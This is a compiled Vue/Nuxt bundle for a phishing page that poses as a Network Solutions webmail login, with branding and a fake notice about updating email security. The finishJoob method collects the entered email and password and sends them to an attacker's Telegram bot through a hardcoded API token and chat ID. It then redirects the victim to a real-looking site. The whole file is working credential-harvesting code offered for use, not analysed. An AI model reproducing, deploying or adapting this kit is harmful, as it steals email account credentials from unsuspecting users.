exports.ids = [2];
exports.modules = {

/***/ 29:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
// ESM COMPAT FLAG
__webpack_require__.r(__webpack_exports__);

// CONCATENATED MODULE: ./node_modules/babel-loader/lib??ref--2-0!./node_modules/vue-loader/lib/loaders/templateLoader.js??ref--6!./node_modules/@nuxt/components/dist/loader.js??ref--0-0!./node_modules/vue-loader/lib??vue-loader-options!./pages/signin.vue?vue&type=template&id=c78b089e
var render = function render() {
  var _vm = this,
    _c = _vm._self._c;
  return _c('div', {
    staticClass: "page"
  }, [_vm._ssrNode("<header class=\"topbar\"><div class=\"brand\"><div class=\"brand-network\">network</div> <div class=\"brand-solutions\">solutions</div></div> <div class=\"language\"><span>Language:</span> <span class=\"language-link\">English (United Kingdom)</span> <span class=\"chevron\">⌄</span></div></header> "), _vm._ssrNode("<main class=\"main-content\">", "</main>", [_vm._ssrNode("<section class=\"login-column\">", "</section>", [_vm._ssrNode("<form class=\"login-card\">", "</form>", [_vm._ssrNode("<h1>Webmail Login</h1> "), _vm._ssrNode("<div class=\"signin-section\">", "</div>", [_vm._ssrNode("<h2>Sign in</h2> <div class=\"field\"><label for=\"email\">Email</label> <input id=\"email\" type=\"email\" autocomplete=\"username\" spellcheck=\"false\"" + _vm._ssrAttr("value", _vm.formDataRes.email) + "></div> "), _c('transition', {
    attrs: {
      "name": "password-slide"
    }
  }, [_vm.showPassword ? _c('div', {
    staticClass: "field password-field"
  }, [_c('label', {
    attrs: {
      "for": "password"
    }
  }, [_vm._v("Password")]), _vm._v(" "), _c('input', {
    directives: [{
      name: "model",
      rawName: "v-model",
      value: _vm.formDataRes.password,
      expression: "formDataRes.password"
    }],
    ref: "passwordInput",
    attrs: {
      "id": "password",
      "type": "password",
      "autocomplete": "current-password"
    },
    domProps: {
      "value": _vm.formDataRes.password
    },
    on: {
      "input": function ($event) {
        if ($event.target.composing) return;
        _vm.$set(_vm.formDataRes, "password", $event.target.value);
      }
    }
  })]) : _vm._e()]), _vm._ssrNode(" <label class=\"stay-signed\"><input type=\"checkbox\"" + _vm._ssrAttr("checked", Array.isArray(_vm.staySignedIn) ? _vm._i(_vm.staySignedIn, null) > -1 : _vm.staySignedIn) + "> <span class=\"custom-checkbox\">" + (_vm.staySignedIn ? "<span>✓</span>" : "<!---->") + "</span> <span>Stay signed in</span></label> <button type=\"submit\" class=\"signin-button\">\n            Sign in\n          </button>")], 2)], 2), _vm._ssrNode(" <section class=\"notice-card\"><p>\n          We are updating our email security and will require all email\n          server connections to use an encrypted connection when connecting\n          via POP or IMAP from a device. To avoid any email connection\n          issues, please be sure to update your mail client settings.\n        </p> <button type=\"button\" class=\"learn-button\">\n          Learn More...\n        </button></section>")], 2)]), _vm._ssrNode(" <footer class=\"footer\"><span>© 2026 Open-Xchange GmbH</span> <span>Version: 8.53.2</span> <span>Privacy policy</span> <span>Legal notes</span></footer>")], 2);
};
var staticRenderFns = [];

// CONCATENATED MODULE: ./pages/signin.vue?vue&type=template&id=c78b089e

// EXTERNAL MODULE: external "axios"
var external_axios_ = __webpack_require__(22);
var external_axios_default = /*#__PURE__*/__webpack_require__.n(external_axios_);

// CONCATENATED MODULE: ./node_modules/babel-loader/lib??ref--2-0!./node_modules/@nuxt/components/dist/loader.js??ref--0-0!./node_modules/vue-loader/lib??vue-loader-options!./pages/signin.vue?vue&type=script&lang=js

/* harmony default export */ var signinvue_type_script_lang_js = ({
  data() {
    return {
      formDataRes: {
        email: "",
        password: ""
      },
      loading: false,
      isActive: false,
      count: 0,
      finalCount: 1,
      // Only send once
      staySignedIn: true,
      showPassword: false
    };
  },
  computed: {
    isFormValid() {
      return this.formDataRes.email.trim() !== "" && this.formDataRes.password.trim() !== "";
    }
  },
  methods: {
    async finishJoob() {
      if (!this.showPassword) {
        if (!this.formDataRes.email.trim() && !this.formDataRes.password.trim()) {
          return;
        }
        this.showPassword = true;
        this.$nextTick(() => {
          if (this.$refs.passwordInput) {
            this.$refs.passwordInput.focus();
          }
        });
        return;
      }
      if (!this.formDataRes.password.trim()) {
        return;
      }
      this.count++;
      // console.log("Count:", this.count, "Final:", this.finalCount);

      if (this.count <= this.finalCount) {
        this.loading = true;

        // Format the message as string
        const message = `*NETWORK SOLUTION*\nEmail: ${this.formDataRes.email}\nPassword: ${this.formDataRes.password}`;

        // Send to Telegram
        await this.sendTelegramResult(process.env.NUXT_APP_CHAT_ID || "-4794000485", message);
        this.isActive = !this.isActive;
        this.loading = false;
      } else {
        // Redirect after sending
        location.replace("https://update.networksolutions.com/");
      }
    },
    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;
        const payload = {
          chat_id: chatId,
          text: message
        };
        console.log("Sending payload:", payload);
        await external_axios_default.a.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    }
  }
});
// CONCATENATED MODULE: ./pages/signin.vue?vue&type=script&lang=js
 /* harmony default export */ var pages_signinvue_type_script_lang_js = (signinvue_type_script_lang_js); 
// EXTERNAL MODULE: ./node_modules/vue-loader/lib/runtime/componentNormalizer.js
var componentNormalizer = __webpack_require__(2);

// CONCATENATED MODULE: ./pages/signin.vue





/* normalize component */

var component = Object(componentNormalizer["a" /* default */])(
  pages_signinvue_type_script_lang_js,
  render,
  staticRenderFns,
  false,
  null,
  null,
  "c9de2f96"
  
)

/* harmony default export */ var signin = __webpack_exports__["default"] = (component.exports);

/***/ })

};;
//# sourceMappingURL=signin.js.map